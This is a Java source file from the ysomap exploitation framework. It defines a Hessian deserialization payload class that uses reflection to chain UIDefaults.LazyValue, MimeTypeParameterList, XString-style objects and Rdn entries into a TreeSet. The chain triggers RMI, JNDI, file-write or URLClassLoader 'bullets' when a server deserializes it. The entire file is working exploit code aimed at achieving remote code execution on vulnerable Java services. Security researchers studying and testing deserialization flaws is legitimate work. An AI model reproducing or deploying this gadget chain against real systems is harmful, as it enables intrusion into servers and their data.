package ysomap.payloads.hessian;

import com.sun.org.apache.xml.internal.utils.FastStringBuffer;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.SwingLazyValueWithRMIBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;

/**
 * @author wh1t3P1g
 * @since 2021/11/12
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.HESSIAN })
@Dependencies({"hessian"})
@Require(bullets = {
        "SwingLazyValueWithJNDIBullet",
        "SwingLazyValueWithRMIBullet",
        "LazyValueWithFileWrite1Bullet",
        "LazyValueWithFileWrite2Bullet",
        "SwingLazyValueWithUrlClassLoaderBullet"}, param = false)
public class LazyValueForHessian extends HessianPayload {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return SwingLazyValueWithRMIBullet.newInstance(args);
    }

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof UIDefaults.LazyValue;
    }

    @Override
    public Object pack(Object obj) throws Exception {
        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("ysomap", obj);
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
        ReflectionHelper.setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);
        Object xstring = ReflectionHelper.createWithoutConstructor("com.sun.org.apache.xpath.internal.objects.XStringForFSB");
        ReflectionHelper.setFieldValue(xstring, "m_obj", new FastStringBuffer());
        xstring = ReflectionHelper.createWithoutConstructor("javax.sound.sampled.AudioFileFormat$Type");
        Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
        ReflectionHelper.setFieldValue(rdnEntry1, "value", xstring);

        Object rdnEntry2 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        ReflectionHelper.setFieldValue(rdnEntry2, "type", "ysomap");
        ReflectionHelper.setFieldValue(rdnEntry2, "value", mimeTypeParameterList);

        return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);
    }

}
